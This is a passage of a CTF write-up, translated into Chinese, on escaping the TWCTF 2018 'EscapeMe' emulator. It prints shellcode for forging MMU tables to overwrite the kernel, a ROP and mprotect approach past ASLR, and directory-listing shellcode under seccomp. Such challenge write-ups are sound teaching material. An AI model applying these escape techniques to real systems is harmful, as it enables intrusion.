在模拟器中，pfree(addr, len)根本不关心参数len（它的函数原型是pfree(void*)）。
因此，如果内存的addr的长度为0x2000，则调用munmap(addr, 0x1000)，在内核中只有第一页被取消映射，而在模拟器中所有内存都将被释放！
为了更好的理解这一点，请参阅之前的代码：
    shellcode = asm(
            mmap(0x7fff1ffc000, 0x2000) +
            munmap(0x7fff1ffc000, 0x1000) +
            mmap(0x217000, 0x1000)
    )
该shellcode被执行后，用户仍然可以访问0x7fff1ffc000 +
0x1000处的内存，不过，它现在将指向映射0x217000期间由paclloc处理的MMU表项！
**漏洞利用**
* * *
如果我们可以伪造MMU表，事情就会迎刃而解。经过一些正确的设置后，我的0x217000映射到了物理地址0x0，即内核代码所在地址。
现在，我们只需要调用 read(0, 0x217000+off, len)来覆盖内核即可。
在模拟器中有一个非常有用的超级调用，它用于将文件读入缓冲区。利用这个调用，我们可以轻松读取flag2.txt。
    kernel_sc = asm('''
            mov rdi, 0
            call sys_load_file
            movabs rdi, 0x8040000000
            add rdi, rax
            mov rsi, 100
            call sys_write
            ret
        sys_write:
            mov eax, 0x11
            mov rbx, rdi
            mov rcx, rsi
            mov rdx, 0
            vmmcall
            ret
        sys_load_file:
            mov eax, 0x30
            mov ebx, 2 /* index 2, the flag2.txt */
            mov rcx, rdi /* addr */
            mov esi, 100 /* len */
            movabs rdx, 0x0
            vmmcall
            ret
            ''')
这个阶段的完整脚本可以从[这里](https://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp2.py "这里")下载。
Flag2:
TWCTF{ABI_1nc0n51573ncy_l34d5_70_5y573m_d357ruc710n}
**EscapeMe3：掌控世界**
* * *
现在是最后一个阶段，即黑掉模拟器。
为了黑掉模拟器，我们必须搞清楚是否安装了seccomp规则。
**漏洞分析**
* * *
在EscapeMe2中，我们已经能够伪造MMU表，这对于这个阶段也是非常有用的。MMU表上的物理内存记录，实际上就是（在模拟器中）mmap处理过的页面的偏移量，该页面正好位于libc-2.27.so所在页面的前面。因此，通过仔细伪造MMU表，我们就能够访问glibc中的内存。
同时，在seccomp规则中也存在一个漏洞，不过，这是我在后来发现的。实际上，这还得感谢我的强大的工具[seccomp-tools](https://github.com/david942j/seccomp-tools "seccomp-tools")：D
Seccomp-tools的模拟器清楚地表明，如果args[0]&0xff < 7，我们就可以调用所有的系统调用。
接下来的事情就没有什么好说的了，只要黑掉它即可。
**漏洞利用**
* * *
使用伪造MMU表，我们就能访问任意内存，不过，首先要绕过ASLR。为此，可以在libc中读取指针，以泄漏libc的基址和argv的地址。这样，我们就可以在堆栈上编写ROP链了。
我使用ROP链调用mprotect(stack, 0x3000, 7)，并将控制权返回给堆栈上的shellcode。
由于受到seccomp的限制，我们无法启动shell，因为execve之后的系统调用（如open）会被禁止。所以，我决定通过编写ls
shellcode来获取flag3的文件名：
    asm('''
            /* open('.') */
            mov rdi, 0x605000
            mov rax, 0x2e /* . */
            mov [rdi], rax
            mov rax, 2
            xor rsi, rsi
            cdq
            syscall
            /* getdents */
            mov rdi, rax
            mov rax, 0x4e
            mov rsi, 0x605000
            cdq
            mov dh, 0x10
            syscall
            /* write */
            mov rdi, 1
            mov rsi, 0x605000
            mov rdx, rax
            mov rax, 1
            syscall
        '''))
得到了如下所示的输出：
然后，读取文件flag3-415254a0b8be92e0a976f329ad3331aa6bbea816.txt，从而获得了最终的旗标。
完整的脚本可以从[这里](https://github.com/david942j/ctf-writeups/blob/master/twctf-2018/EscapeMe/exp3.py "这里")下载。
Flag3:
TWCTF{Or1g1n4l_Hyp3rc4ll_15_4_h07b3d_0f_bug5}
**小结**
* * *
这个挑战让我学到了很多关于KVM的知识（虽然它在这个挑战中并不重要），并且逐级设计的逃逸技术，不仅非常强大，并且非常有趣。
接下来，我将写一篇文章，专门为初学者详细讲解KVM的工作原理，所以，请大家耐心等待。
最后，再次感谢[@shift_crops](https://twitter.com/shift_crops
"@shift_crops")让我度过一个愉快的周末：D